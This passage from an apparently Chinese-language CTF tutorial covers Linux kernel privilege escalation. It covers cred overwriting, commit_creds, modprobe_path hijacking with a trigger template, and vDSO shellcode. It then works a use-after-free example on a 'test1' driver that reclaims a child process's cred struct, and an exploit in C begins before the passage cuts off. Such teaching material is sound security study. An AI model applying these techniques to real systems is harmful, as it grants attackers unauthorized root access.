comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>修改</p>
<ul>
<li>修改 <code>cred</code> 指针为内核镜像中<strong>已有的</strong><code> init_cred</code> 的地址。这种方法适合于我们<strong>能够直接修改 cred 指针以及知道 init_cred 地址</strong>的情况</li>
<li>伪造一个 <code>cred</code>，然后修改 <code>cred</code> 指针指向该地址即可。比较麻烦，一般不使用</li>
</ul>
</li>
</ul>
<h6 id="间接定位-1"><a href="#间接定位-1" class="headerlink" title="间接定位"></a>间接定位</h6><ul>
<li><p><code>commit_creds(&amp;init_cred)</code></p>
<p><code>commit_creds()</code> :将一个新的 <code>cred</code> 设为当前进程 <code>task_struct</code> 的 <code>real_cred</code> 与 <code>cred</code> 字段，调用该函数并传入一个具有 <code>root</code> 权限的 <code>cred</code>，则能直接完成对当前进程的提权工作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *new)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;<span class="comment">//内核宏，用以从 percpu 段获取当前进程的 PCB</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    rcu_assign_pointer(task-&gt;real_cred, new);</span><br><span class="line">    rcu_assign_pointer(task-&gt;cred, new);</span><br></pre></td></tr></table></figure>

<p>在内核初始化过程当中会以 <code>root</code> 权限启动 <code>init</code> 进程，其 <code>cred</code> 结构体为<strong>静态定义</strong>的 <code>init_cred</code>，可以通过 <code>commit_creds(&amp;init_cred)</code> 来完成提权的工作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">init_cred</span> =</span> &#123;</span><br><span class="line">    .usage          = ATOMIC_INIT(<span class="number">4</span>),</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    .subscribers        = ATOMIC_INIT(<span class="number">2</span>),</span><br><span class="line">    .magic          = CRED_MAGIC,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    .uid            = GLOBAL_ROOT_UID,</span><br><span class="line">    .gid            = GLOBAL_ROOT_GID,</span><br><span class="line">    .suid           = GLOBAL_ROOT_UID,</span><br><span class="line">    .sgid           = GLOBAL_ROOT_GID,</span><br><span class="line">    .euid           = GLOBAL_ROOT_UID,</span><br><span class="line">    .egid           = GLOBAL_ROOT_GID,</span><br><span class="line">    .fsuid          = GLOBAL_ROOT_UID,</span><br><span class="line">    .fsgid          = GLOBAL_ROOT_GID,</span><br><span class="line">    .securebits     = SECUREBITS_DEFAULT,</span><br><span class="line">    .cap_inheritable    = CAP_EMPTY_SET,</span><br><span class="line">    .cap_permitted      = CAP_FULL_SET,</span><br><span class="line">    .cap_effective      = CAP_FULL_SET,</span><br><span class="line">    .cap_bset       = CAP_FULL_SET,</span><br><span class="line">    .user           = INIT_USER,</span><br><span class="line">    .user_ns        = &amp;init_user_ns,</span><br><span class="line">    .group_info     = &amp;init_groups,</span><br><span class="line">    .ucounts        = &amp;init_ucounts,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>commit_creds(prepare_kernel_cred(0))</code>-<code>6.2</code>之后失效</p>
<p><code>prepare_kernel_cred()</code> 函数用以拷贝指定进程的 <code>cred</code> 结构体，参数为 <code>NULL </code>时，该函数会拷贝 <code>init_cred</code> 并返回一个有着 <code>root</code> 权限的 <code>cred</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (daemon)</span><br><span class="line">        old = get_task_cred(daemon);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        old = get_cred(&amp;init_cred);</span><br></pre></td></tr></table></figure>

<p>调用 <code>commit_creds(prepare_kernel_cred(NULL))</code>能直接完成提权的工作</p>
<p>不过自从内核版本 <code>6.2</code> 起，<code>prepare_kernel_cred(NULL)</code> 将<strong>不再拷贝 init_cred，而是将其视为一个运行时错误并返回 NULL</strong>，因此内核<code>6.2</code>之后失效</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WARN_ON_ONCE(!daemon))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="改变别人"><a href="#改变别人" class="headerlink" title="改变别人"></a>改变别人</h4><p>通过影响高权限进程的执行，使其完成我们想要的功能</p>
<h5 id="改数据"><a href="#改数据" class="headerlink" title="改数据"></a>改数据</h5><p><strong>符号链接</strong></p>
<p>如果一个 <code>root </code>权限的进程会执行一个<strong>符号链接</strong>的程序，并且该<strong>符号链接或者符号链接指向的程序</strong>可以由攻击者控制，攻击者就可以实现提权</p>
<ul>
<li><p><code>call_usermodehelper</code></p>
<p>一种内核线程执行用户态应用的方式，并且启动的进程具有<code>root</code>权限，通过改变某个变量指定的具体要执行的应用提权</p>
<ul>
<li><p>修改<code>modprobe_path</code></p>
<ul>
<li><p>获取<code>modprobe_path</code></p>
<p>地址</p>
<ul>
<li>直接定位：取值确定，<code>modprobe_path</code>扫描内存寻找字符串</li>
<li>间接定位：相对内核基址偏移固定，先获取内核基址再通过偏移得到地址</li>
</ul>
</li>
<li><p>修改<code>modprobe_path</code>为指定的程序</p>
</li>
<li><p>触发<code>call_modprobe</code></p>
<ul>
<li>执行满足相应要求的非法可执行文件</li>
<li>使用未知协议触发</li>
</ul>
</li>
</ul>
<p>模板如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// step 1. modify modprobe_path to the target value</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// step 2. create related file</span></span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\ncat flag&#x27; &gt; /home/pwn/catflag.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/catflag.sh&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 3. trigger it using unknown executable</span></span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/home/pwn/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 3. trigger it using unknown protocol</span></span><br><span class="line">socket(AF_INET,SOCK_STREAM,<span class="number">132</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改 <code>poweroff_cmd</code></p>
</li>
</ul>
</li>
<li><p><code>poweroff_cmd</code></p>
<ul>
<li>获取<code>poweroff_cmd</code>地址，方法同上</li>
<li>修改 <code>poweroff_cmd</code> 为指定的程序</li>
<li>劫持控制流执行 <code>__orderly_poweroff</code></li>
</ul>
</li>
</ul>
<h5 id="改代码"><a href="#改代码" class="headerlink" title="改代码"></a>改代码</h5><p>修改<code>root</code>权限执行的代码，内核中 <code>vDSO</code> 的代码会被映射到所有的用户态进程中,高特权的进程周期性地调用 <code>vDSO</code> 中的函数时可以考虑把 <code>vDSO</code> 中相应的函数修改为特定的 <code>shellcode</code>,早期<code>vDSO</code> 是可写的，后来引入 <code>post-init read-only</code> 的数据，即将初始化后不再被写的数据标记为只读，来防御这样的利用</p>
<ul>
<li><p>定位 <code>vDSO</code></p>
<ul>
<li><p><code>IDA</code>在<code>vmlinux</code>里定位<code>vDSO</code></p>
<p>点击<code>init_vdso函数 -&gt; vdso_image_64 / vdso_image_x32 -&gt; raw_data</code></p>
<p>或直接使用<code>raw_data</code>来寻找<code>vDSO</code></p>
</li>
<li><p>内存中定位</p>
<p>直接定位：<code>vDSO</code>是一个<code>ELF</code>文件，有<code>ELF</code>文件头，<code>vDSO</code>特定位置存储导出函数的字符串，根据这两个特征扫描内存</p>
<p><code>vDSO</code>相对内核基址偏移固定，先获取内核基址再根据偏移得到地址</p>
</li>
</ul>
</li>
<li><p>修改 <code>vDSO</code> 的特定函数为指定的 <code>shellcode</code></p>
</li>
<li><p>等待触发执行 <code>shellcode</code></p>
</li>
</ul>
<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><h5 id="改变自身-1"><a href="#改变自身-1" class="headerlink" title="改变自身"></a>改变自身</h5><ul>
<li>改<code>cred</code>结构体：扫描内存定位&#x2F;<code>task_struct</code>结构体存放<code>cred</code>结构体指针&#x2F;<code>comm</code>偏移定位<code>cred</code>结构体位置，通过任意地址写&#x2F;<code>rop</code>来改<code>cred</code>中的<code>uid-fsgid</code>为<code>0</code></li>
<li>改<code>cred</code>结构体指针：<code>task_struct</code>结构体存放<code>cred</code>结构体指针&#x2F;<code>comm</code>偏移定位<code>cred</code>结构体指针位置，能够直接修改 <code>cred</code> 指针以及知道有<code>root</code>权限的 <code>init_cred</code> 地址时，修改 <code>cred</code> 指针为内核镜像中已有的<code> init_cred</code> 的地址</li>
<li><code>UAF</code> 使用同样堆块控制<code>cred</code>结构体-过时</li>
<li><code>commit_creds(&amp;init_cred)</code>，传入有<code>root</code>权限的<code>init_cred</code>的地址</li>
<li><code>commit_creds(prepare_kernel_cred(0))</code>-<code>6.2</code>之后失效</li>
</ul>
<h5 id="改变别人-1"><a href="#改变别人-1" class="headerlink" title="改变别人"></a>改变别人</h5><ul>
<li>修改<code>modprobe_path</code>为指定程序之后触发 <code>call_modprobe</code></li>
<li>修改 <code>poweroff_cmd</code> 为指定的程序之后触发<code>__orderly_poweroff</code></li>
<li>写<code>vDSO</code>为<code>shellcode</code></li>
</ul>
<h3 id="泄露敏感信息"><a href="#泄露敏感信息" class="headerlink" title="泄露敏感信息"></a>泄露敏感信息</h3><p>需要我们具有读取内核数据的能力，具体想要泄漏什么数据与利用场景紧密相关</p>
<h3 id="DoS"><a href="#DoS" class="headerlink" title="DoS"></a>DoS</h3><p>即使得内核崩溃</p>
<ul>
<li>触发内核中的某个<strong>漏洞</strong>让内核崩溃</li>
<li>触发内核中的<strong>死锁</strong></li>
<li>触发<strong>大量的内核内存泄漏</strong>，即存在大量的内存被申请但是没有被释放</li>
</ul>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h2><p>kernel pwn的uaf，适用于<strong>无锁且有全局变量</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">test1_release</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( test1_buffer )</span><br><span class="line">    kfree(test1_buffer);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是init()</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief test1 内核模块的初始化函数</span></span><br><span class="line"><span class="comment"> * @details 当使用 `insmod` 加载模块时，内核会调用此函数。</span></span><br><span class="line"><span class="comment"> *          它的主要工作是注册一个名为 &quot;test1&quot; 的字符设备，并创建 /dev/test1 设备节点。</span></span><br><span class="line"><span class="comment"> * @return 成功返回 0，失败返回 -1。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">test1_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// 用于临时存储主设备号</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// 用于存储函数返回值（错误码）</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> *<span class="title">v2</span>;</span> <span class="comment">// 用于存储创建的设备类的指针</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 内核函数入口点，用于 ftrace 等追踪工具。</span></span><br><span class="line">  _fentry__(); </span><br><span class="line"></span><br><span class="line">  <span class="comment">// 步骤 1: 动态向内核申请一个字符设备区域（即一组设备号）。</span></span><br><span class="line">  <span class="comment">//         如果成功，分配的主设备号会存入全局变量 test1_major 中。</span></span><br><span class="line">  <span class="keyword">if</span> ( (&amp;alloc_chrdev_region)(&amp;test1_major, <span class="number">0LL</span>, <span class="number">1LL</span>, <span class="string">&quot;test1&quot;</span>) &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">// 申请失败，模块加载失败</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 步骤 2: 初始化字符设备结构体 test1_cdev。</span></span><br><span class="line">  <span class="comment">//         这是最关键的绑定步骤之一，它将 cdev 结构体与我们的文件操作函数集 (test1_fops) 关联起来。</span></span><br><span class="line">  <span class="comment">//         在内部，这行代码主要完成了 `test1_cdev.ops = &amp;test1_fops;` 的操作。</span></span><br><span class="line">  <span class="comment">//         这样内核就知道对这个设备进行 open/read/write 时该调用哪个函数了。</span></span><br><span class="line">  cdev_init(&amp;test1_cdev, &amp;test1_fops);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 将刚刚获取的主设备号存入 v0，供 cdev_add 使用。</span></span><br><span class="line">  v0 = test1_major;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 步骤 3: 设置 cdev 结构体的 owner 字段，指向当前模块本身。</span></span><br><span class="line">  <span class="comment">//         这可以防止模块在使用中被意外卸载 (rmmod)，是保证内核稳定性的重要措施。</span></span><br><span class="line">  test1_cdev.owner = &amp;_this_module;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 步骤 4: 向内核正式注册（添加）这个字符设备。</span></span><br><span class="line">  <span class="comment">//         内核会将这个 test1_cdev 结构体添加到系统的字符设备链表中，</span></span><br><span class="line">  <span class="comment">//         并与之前申请的设备号关联起来，此时设备就“上线”了。</span></span><br><span class="line">  v1 = cdev_add(&amp;test1_cdev, v0, <span class="number">1LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 ) <span class="comment">// 如果 cdev_add 返回非零值，表示添加失败</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="number">-1</span>;</span><br><span class="line">    printk(&amp;unk_334); <span class="comment">// 打印错误信息</span></span><br><span class="line">    <span class="comment">// 回滚操作：注销之前申请的设备号区域。</span></span><br><span class="line">    unregister_chrdev_region(test1_major, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 步骤 5: 创建一个设备类 (device class)，名为 &quot;test1&quot;。</span></span><br><span class="line">  <span class="comment">//         这是为了让 udev/mdev 服务能够自动在 /dev 目录下创建设备文件。</span></span><br><span class="line">  v2 = _class_create(&amp;_this_module, <span class="string">&quot;test1&quot;</span>, &amp;alloc_chrdev_region);</span><br><span class="line">  test1_class = v2; <span class="comment">// 将返回的类指针存入全局变量</span></span><br><span class="line">  <span class="keyword">if</span> ( !v2 ) <span class="comment">// 如果类创建失败</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_35D); <span class="comment">// 打印错误信息</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_8; <span class="comment">// 跳转到统一的错误处理代码块</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 步骤 6: 在刚创建的类下面创建一个具体的设备实例。</span></span><br><span class="line">  <span class="comment">//         这一步会触发 udev，在用户空间的 /dev 目录下创建名为 &quot;test1&quot; 的设备节点文件。</span></span><br><span class="line">  <span class="keyword">if</span> ( !device_create(v2, <span class="number">0LL</span>, test1_major, <span class="number">0LL</span>, <span class="string">&quot;test1&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_346); <span class="comment">// 打印错误信息</span></span><br><span class="line">    <span class="comment">// 如果设备创建失败，需要销毁之前创建的类。</span></span><br><span class="line">    class_destroy(test1_class);</span><br><span class="line">LABEL_8: <span class="comment">// 统一的错误处理标签，用于处理后半段发生的错误</span></span><br><span class="line">    v1 = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// 按注册顺序的逆序进行清理</span></span><br><span class="line">    cdev_del(&amp;test1_cdev); <span class="comment">// 从内核中删除字符设备</span></span><br><span class="line">    unregister_chrdev_region(test1_major, <span class="number">1LL</span>); <span class="comment">// 注销设备号</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 如果所有步骤都成功，v1 初始值为 0，函数返回 0 表示成功。</span></span><br><span class="line">  <span class="comment">// 如果中途失败，v1 会被设为 -1。</span></span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关于<code>kmalloc_caches[5]</code>这个可以通过命令<code>cat /proc/slabinfo | grep kmalloc</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># cat /proc/slabinfo | grep kmalloc</span></span><br><span class="line">dma-kmalloc-8192       0      0   8192    4    8 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">dma-kmalloc-4096       0      0   4096    8    8 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">dma-kmalloc-2048       0      0   2048    8    4 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">dma-kmalloc-1024       0      0   1024    8    2 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">dma-kmalloc-512        8      8    512    8    1 : tunables    0    0    0 : slabdata      1      1      0</span><br><span class="line">dma-kmalloc-256        0      0    256   16    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">dma-kmalloc-128        0      0    128   32    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">dma-kmalloc-64         0      0     64   64    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">dma-kmalloc-32         0      0     32  128    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">dma-kmalloc-16         0      0     16  256    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">dma-kmalloc-8          0      0      8  512    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">dma-kmalloc-192        0      0    192   21    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">dma-kmalloc-96         0      0     96   42    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">kmalloc-8192           8      8   8192    4    8 : tunables    0    0    0 : slabdata      2      2      0</span><br><span class="line">kmalloc-4096          56     56   4096    8    8 : tunables    0    0    0 : slabdata      7      7      0</span><br><span class="line">kmalloc-2048         136    136   2048    8    4 : tunables    0    0    0 : slabdata     17     17      0</span><br><span class="line">kmalloc-1024         312    312   1024    8    2 : tunables    0    0    0 : slabdata     39     39      0</span><br><span class="line">kmalloc-512          264    264    512    8    1 : tunables    0    0    0 : slabdata     33     33      0</span><br><span class="line">kmalloc-256          272    272    256   16    1 : tunables    0    0    0 : slabdata     17     17      0</span><br><span class="line">kmalloc-192         1050   1050    192   21    1 : tunables    0    0    0 : slabdata     50     50      0</span><br><span class="line">kmalloc-128          448    448    128   32    1 : tunables    0    0    0 : slabdata     14     14      0</span><br><span class="line">kmalloc-96           462    462     96   42    1 : tunables    0    0    0 : slabdata     11     11      0</span><br><span class="line">kmalloc-64          1280   1280     64   64    1 : tunables    0    0    0 : slabdata     20     20      0</span><br><span class="line">kmalloc-32           896    896     32  128    1 : tunables    0    0    0 : slabdata      7      7      0</span><br><span class="line">kmalloc-16           768    768     16  256    1 : tunables    0    0    0 : slabdata      3      3      0</span><br><span class="line">kmalloc-8           2048   2048      8  512    1 : tunables    0    0    0 : slabdata      4      4      0</span><br></pre></td></tr></table></figure>

<p>这个下标（在上面这段code中从kmalloc-8开始是0）5就是kmalloc-128</p>
<p><strong>write()函数</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">test1_write</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buf, <span class="type">size_t</span> count, <span class="type">loff_t</span> *f_pos)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> v4; <span class="comment">// rdx, IDA推断为count</span></span><br><span class="line">  <span class="type">ssize_t</span> v5; <span class="comment">// rbx, 保存count的值</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 length; <span class="comment">// rdi, 用于计算新长度</span></span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// r12, 新分配的缓冲区指针</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax, 返回值</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v5 = v4; <span class="comment">// v5 = count</span></span><br><span class="line">  length = used + v4; <span class="comment">// 计算写入后需要的总长度</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 关键逻辑分支：判断当前缓冲区是否足够大</span></span><br><span class="line">  <span class="keyword">if</span> ( length &lt;= ::length ) <span class="comment">// ::length 是全局变量，表示当前已分配缓冲区的大小</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ---- 分支1: 缓冲区足够大 ----</span></span><br><span class="line">    <span class="comment">// 直接在现有缓冲区的末尾追加数据</span></span><br><span class="line">    copy_from_user(&amp;test1_buffer[used], buf, v4); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ---- 分支2: 缓冲区不够大，需要重新分配 ----</span></span><br><span class="line">    <span class="comment">// 1. 分配一个更大的新缓冲区</span></span><br><span class="line">    dest = _kmalloc(length, <span class="number">0x24000C0L</span>L);</span><br><span class="line">    <span class="comment">// 2. 将旧缓冲区中的数据拷贝到新缓冲区</span></span><br><span class="line">    <span class="built_in">memcpy</span>(dest, test1_buffer, used);</span><br><span class="line">    <span class="comment">// 3. 释放掉旧的、太小的缓冲区</span></span><br><span class="line">    kfree(test1_buffer);</span><br><span class="line">    <span class="comment">// 4. 将全局指针指向新的缓冲区</span></span><br><span class="line">    test1_buffer = dest;</span><br><span class="line">    <span class="comment">// 5. 更新全局的缓冲区大小记录</span></span><br><span class="line">    ::length = used + v5;</span><br><span class="line">    <span class="comment">// 6. 将用户传入的新数据拷贝到新缓冲区的末尾</span></span><br><span class="line">    copy_from_user(&amp;dest[used], buf, v5); <span class="comment">// &lt;-- 你断点的位置</span></span><br><span class="line">  &#125;</span><br><span class="line">  result = v5;</span><br><span class="line">  used += v5; <span class="comment">// 更新已使用的数据长度</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp的思路：</p>
<h4 id="第一步：制造悬垂指针-UAF"><a href="#第一步：制造悬垂指针-UAF" class="headerlink" title="第一步：制造悬垂指针 (UAF)"></a>第一步：制造悬垂指针 (UAF)</h4><ol>
<li>int fd &#x3D; open(“&#x2F;dev&#x2F;test1”, 6);<ul>
<li>内核调用 test1_open，分配了一个<strong>32字节</strong>的缓冲区 kbuf_A。</li>
<li>全局指针 test1_buffer 指向 kbuf_A。</li>
</ul>
</li>
<li>int fd2 &#x3D; open(“&#x2F;dev&#x2F;test1”, 6);<ul>
<li>内核再次调用 test1_open，分配了一个<strong>32字节</strong>的缓冲区 kbuf_B。</li>
<li>全局指针 test1_buffer <strong>被覆盖</strong>，现在指向 kbuf_B。</li>
</ul>
</li>
<li>write(fd2, buf, 0x8a)————<strong>这里需要明白在执行write()时是怎么操作的</strong><ul>
<li>内核调用 test1_write。此时 used&#x3D;0, count&#x3D;0x8a(138), 全局 length&#x3D;32。</li>
<li>0 + 138 &gt; 32，条件成立，进入 else 分支。</li>
<li>dest &#x3D; _kmalloc(138, …)：分配了一个<strong>138字节</strong>的新缓冲区 kbuf_C。</li>
<li>memcpy(dest, test1_buffer, 0)：把 kbuf_B 的内容（0字节）拷到 kbuf_C。</li>
<li>kfree(test1_buffer)：<strong>释放了32字节的 kbuf_B</strong>。</li>
<li>test1_buffer &#x3D; dest：全局指针 test1_buffer 现在指向<strong>138字节的 kbuf_C</strong>。</li>
<li>::length &#x3D; 138：全局长度更新为138。</li>
<li>copy_from_user(…)：将用户数据写入 kbuf_C。</li>
</ul>
</li>
<li>close(fd2);<ul>
<li>内核调用 test1_release。</li>
<li>函数执行 kfree(test1_buffer)。</li>
<li>此时 test1_buffer 指向的是<strong>138字节的 kbuf_C</strong>。所以，kbuf_C 被释放了。</li>
<li><strong>关键点</strong>：test1_buffer 指针没有被清零，它现在成了一个指向<strong>刚刚被释放的138字节内存</strong>的<strong>悬垂指针 (Dangling Pointer)</strong>。</li>
</ul>
</li>
</ol>
<h4 id="第二步：内存占位"><a href="#第二步：内存占位" class="headerlink" title="第二步：内存占位"></a>第二步：内存占位</h4><ol>
<li>int pid &#x3D; fork();<ul>
<li>内核为了创建子进程，需要分配一个 struct cred 结构体来存放其权限信息。</li>
<li>内核的内存分配器（SLUB&#x2F;SLAB）会寻找一块大小合适的空闲内存。</li>
<li><strong>struct cred 的大小通常在120-170(这道题是128)字节之间</strong>，我们刚刚释放的<strong>138字节</strong>的内存块 (kbuf_C 所在的位置) 是一个完美的候选者！</li>
<li><strong>“奇迹”发生</strong>：内核极大概率会在这块刚刚被释放的内存上分配新的 cred 结构体。</li>
<li><strong>结果</strong>：现在，悬垂指针 test1_buffer <strong>实际上已经指向了子进程的 cred 结构体</strong>。</li>
</ul>
</li>
</ol>
<h4 id="第三步：触发漏洞，完成写入"><a href="#第三步：触发漏洞，完成写入" class="headerlink" title="第三步：触发漏洞，完成写入"></a>第三步：触发漏洞，完成写入</h4><ol>
<li>在子进程中执行 write(fd, buf, 0x28)<ul>
<li>内核再次调用 test1_write。此时 used 可能是0（被之前的read重置或新进程开始时为0），count&#x3D;0x28(40)。全局 length 仍然是<strong>138</strong>。</li>
<li>0 + 40 &lt;&#x3D; 138，条件成立，这次进入的是 <strong>if 分支</strong>！</li>
<li>内核执行 copy_from_user(&amp;test1_buffer[used], buf, v4);</li>
<li>我们来分析此时 copy_from_user 的第一个参数（在x86-64架构下，它会被放入 rdi 寄存器）：<ul>
<li>&amp;test1_buffer[used] 等价于 test1_buffer + 0。</li>
<li>test1_buffer 是什么？是我们在第4步制造的、在第5步被 cred 结构体占据的<strong>悬垂指针</strong>。</li>
<li><strong>所以，rdi 寄存器中的地址，正是子进程 cred 结构体的起始地址！</strong></li>
</ul>
</li>
</ul>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	<span class="comment">// 创建dev_a</span></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/test1&quot;</span>, <span 